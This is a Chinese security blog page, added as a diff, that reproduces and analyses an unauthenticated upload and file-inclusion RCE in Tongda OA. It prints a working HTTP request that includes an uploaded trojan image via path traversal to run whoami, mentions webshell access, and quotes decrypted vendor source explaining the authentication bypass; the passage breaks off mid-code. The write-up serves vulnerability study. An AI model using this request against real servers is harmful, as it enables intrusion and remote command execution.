@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>通达OA文件上传和文件包含导致的RCE复现分析 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="漏洞复现,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>通达OA文件上传和文件包含导致的RCE复现分析</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-03-31
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p></p>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>通达OA是由北京通达信科科技有限公司开发的一款办公系统，前一段时间通达官方在其官网发布了安全提醒与更新程序，并披露有用户遭到攻击。<br>攻击者可在未授权的情况下可上传图片木马文件，之后通过精心构造的请求进行文件包含，实现远程命令执行，且攻击者无须登陆认证即可完成攻击。 </p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>V11版</li>
+<li>2017版</li>
+<li>2016版</li>
+<li>2015版</li>
+<li>2013版</li>
+<li>2013增强版</li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>下面是根据参考的文章，进行的复现分析过程</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先下载通达OA的安装包，我这里使用的是OA11.3，下载后只有一个安装说明和安装文件，双击安装文件，选择路径进行安装。安装后设置端口并启动即可，测试一下攻击机是否能正确访问。</p>
+<p><img src="/article/bdd0a488/image-20200331200920910.png" alt="image-20200331200920910"></p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>因为不需要进行认证就可以进行攻击，所以这里直接复制一个包来go一下，文件内容是一个小木马</p>
+<p><img src="/article/bdd0a488/image-20200331200259894.png" alt="image-20200331200259894"></p>
+<p>可以看到上传成功了，下面进入到靶机中确认一下</p>
+<p><img src="/article/bdd0a488/image-20200331200546211.png" alt="image-20200331200546211"></p>
+<p>可以看到，的确是上传成功了，下面执行命令，复制下面的包go一下，就可以看到执行结果了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/interface/gateway.php HTTP/1.1</span><br><span class="line">Host: 192.168.133</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 69</span><br><span class="line"></span><br><span class="line">json=&#123;"url":"/general/../../attach/im/2003/354900984.jpg"&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
+<p><img src="/article/bdd0a488/image-20200331201227751.png" alt="image-20200331201227751"></p>
+<p>这样就成功执行了命令，也可以通过写入一个文件包含，生成一句话来getshell。</p>
+<h3 id="EXP验证"><a href="#EXP验证" class="headerlink" title="EXP验证"></a>EXP验证</h3><p><img src="/article/bdd0a488/image-20200331201849746.png" alt="image-20200331201849746"></p>
+<p>使用蚁剑连接</p>
+<p><img src="/article/bdd0a488/image-20200331202107759.png" alt="image-20200331202107759"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通达OA对源码进行了加密，所以需要解密一下，进入网站 <a href="http://dezend.qiling.org/free.html" target="_blank" rel="noopener">http://dezend.qiling.org/free.html</a> 上传文件进行解密</p>
+<p><img src="/article/bdd0a488/image-20200331203337802.png" alt="image-20200331203337802"></p>
+<h3 id="漏洞一：未授权上传文件"><a href="#漏洞一：未授权上传文件" class="headerlink" title="漏洞一：未授权上传文件"></a>漏洞一：未授权上传文件</h3><p>文件在 webroot\ispirit\im\upload.php </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">$P = $_POST[<span class="string">'P'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($P) || $P != <span class="string">''</span>) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'inc/session.php'</span>;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">'./auth.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_file.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'inc/utility_msg.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'mobile/inc/funcs.php'</span>;</span><br><span class="line">ob_end_clean();</span><br><span class="line">$TYPE = $_POST[<span class="string">'TYPE'</span>];</span><br><span class="line">$DEST_UID = $_POST[<span class="string">'DEST_UID'</span>];</span><br><span class="line">$dataBack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID != <span class="string">''</span> &amp;&amp; !td_verify_ids($ids)) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'接收方ID无效'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($DEST_UID, <span class="string">','</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $DEST_UID = intval($DEST_UID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($DEST_UID == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE != <span class="number">2</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'接收方ID无效'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$MODULE = <span class="string">'im'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &lt;= count($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) != strlen($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            $_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>] = urldecode($_FILES[<span class="string">'ATTACHMENT'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = upload(<span class="string">'ATTACHMENT'</span>, $MODULE, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!is_array($ATTACHMENTS)) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . $ATTACHMENTS);</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    $ATTACHMENT_ID = substr($ATTACHMENTS[<span class="string">'ID'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    $ATTACHMENT_NAME = substr($ATTACHMENTS[<span class="string">'NAME'</span>], <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ($TYPE == <span class="string">'mobile'</span>) &#123;</span><br><span class="line">        $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'无文件上传'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line"><span class="keyword">if</span> (!$FILE_SIZE) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'文件上传失败'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">        $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">        CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    $P_VER = is_numeric($P_VER) ? intval($P_VER) : <span class="number">0</span>;</span><br><span class="line">    $MSG_CATE = $_POST[<span class="string">'MSG_CATE'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($MSG_CATE == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($MSG_CATE == <span class="string">'image'</span>) &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[im]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/im]'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $DURATION = intval($DURATION);</span><br><span class="line">            $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $AID = <span class="number">0</span>;</span><br><span class="line">    $POS = strpos($ATTACHMENT_ID, <span class="string">'@'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $AID = intval(substr($ATTACHMENT_ID, <span class="number">0</span>, $POS));</span><br><span class="line">    &#125;</span><br><span class="line">    $query = <span class="string">'INSERT INTO im_offline_file (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\',\''</span> . $AID . <span class="string">'\')'</span>;</span><br><span class="line">    $cursor = exequery(TD::conn(), $query);</span><br><span class="line">    $FILE_ID = mysql_insert_id();</span><br><span class="line">    <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'数据库操作失败'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'content'</span> =&gt; $CONTENT, <span class="string">'file_id'</span> =&gt; $FILE_ID);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'2'</span>) &#123;</span><br><span class="line">        $DURATION = intval($_POST[<span class="string">'DURATION'</span>]);</span><br><span class="line">        $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        $query = <span class="string">'INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES (\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\', \''</span> . $CONTENT . <span class="string">'\', \''</span> . time() . <span class="string">'\')'</span>;</span><br><span class="line">        $cursor = exequery(TD::conn(), $query);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'+OK '</span> . $CONTENT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'3'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">                $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">                $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">                CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK '</span> . $ATTACHMENT_ID;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">            $msg_id = send_msg($_SESSION[<span class="string">'LOGIN_UID'</span>], $DEST_UID, <span class="number">1</span>, $CONTENT, <span class="string">''</span>, <span class="number">2</span>);</span><br><span class="line">            $query = <span class="string">'insert into IM_OFFLINE_FILE (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\')'</span>;</span><br><span class="line">            $cursor = exequery(TD::conn(), $query);</span><br><span class="line">            $FILE_ID = mysql_insert_id();</span><br><span class="line">            <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'数据库操作失败'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($FILE_ID == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'数据库操作失败2'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK ,'</span> . $FILE_ID . <span class="string">','</span> . $msg_id;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，第一个if对P进行了判断，只要传递了参数P<strong>或者</strong>不为空，就可以进入下面的语句，如果判断失败，就进入else，也就是身份认证功能，所以这里只需要传递一个P并且值不为空，就可以绕过登录认证，在未授权的情况下进行上传文件。</p>
+<p><img src="/article/bdd0a488/image-20200331212252566.png" alt="image-20200331212252566"></p>
+<p>所以测试的包中传递了P参数而且是空的</p>
+<p><img src="/article/bdd0a488/image-20200331205445923.png" alt="image-20200331205445923">然后下面是判断DEST_UID,只要不为空也不为0即可， 在之后的文件上传处理逻辑代码中，会对<code>$_FILES[&#39;ATTACHMENT&#39;][&#39;name&#39;])</code>进行一次url解码，之后判断解码前后文件名长度是否有变化，如果有变化，则将url解码后的文件名作为最后的文件名。之后追踪upload函数，在 inc/utility_file.php 的1321行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($PREFIX = <span class="string">'ATTACHMENT'</span>, $MODULE = <span class="string">''</span>, $OUTPUT = true)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr($MODULE, <span class="string">'/'</span>) || strstr($MODULE, <span class="string">'\\'</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">            <span class="keyword">return</span> _(<span class="string">'参数含有非法字符。'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Message(_(<span class="string">'错误'</span>), _(<span class="string">'参数含有非法字符。'</span>));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = <span class="keyword">array</span>(<span class="string">'ID'</span> =&gt; <span class="string">''</span>, <span class="string">'NAME'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">    reset($_FILES);</span><br><span class="line">    <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $KEY =&gt; $ATTACHMENT) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACHMENT[<span class="string">'error'</span>] == <span class="number">4</span> || $KEY != $PREFIX &amp;&amp; substr($KEY, <span class="number">0</span>, strlen($PREFIX) + <span class="number">1</span>) != $PREFIX . <span class="string">'_'</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data_charset = <span class="keyword">isset</span>($_GET[<span class="string">'data_charset'</span>]) ? $_GET[<span class="string">'data_charset'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'data_charset'</span>]) ? $_POST[<span class="string">'data_charset'</span>] : <span class="string">''</span>);</span><br><span class="line">        $ATTACH_NAME = $data_charset != <span class="string">''</span> ? td_iconv($ATTACHMENT[<span class="string">'name'</span>], $data_charset, MYOA_CHARSET) : $ATTACHMENT[<span class="string">'name'</span>];</span><br><span class="line">        $ATTACH_SIZE = $ATTACHMENT[<span class="string">'size'</span>];</span><br><span class="line">        $ATTACH_ERROR = $ATTACHMENT[<span class="string">'error'</span>];</span><br><span class="line">        $ATTACH_FILE = $ATTACHMENT[<span class="string">'tmp_name'</span>];</span><br><span class="line">        $ERROR_DESC = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_uploadable($ATTACH_NAME)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'禁止上传后缀名为[%s]的文件'</span>), substr($ATTACH_NAME, strrpos($ATTACH_NAME, <span class="string">'.'</span>) + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            $encode = mb_detect_encoding($ATTACH_NAME, <span class="keyword">array</span>(<span class="string">'ASCII'</span>, <span class="string">'UTF-8'</span>, <span class="string">'GB2312'</span>, <span class="string">'GBK'</span>, <span class="string">'BIG5'</span>));</span><br><span class="line">            <span class="keyword">if</span> ($encode != <span class="string">'UTF-8'</span>) &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = mb_convert_encoding($ATTACH_NAME, <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">            &#125; <span 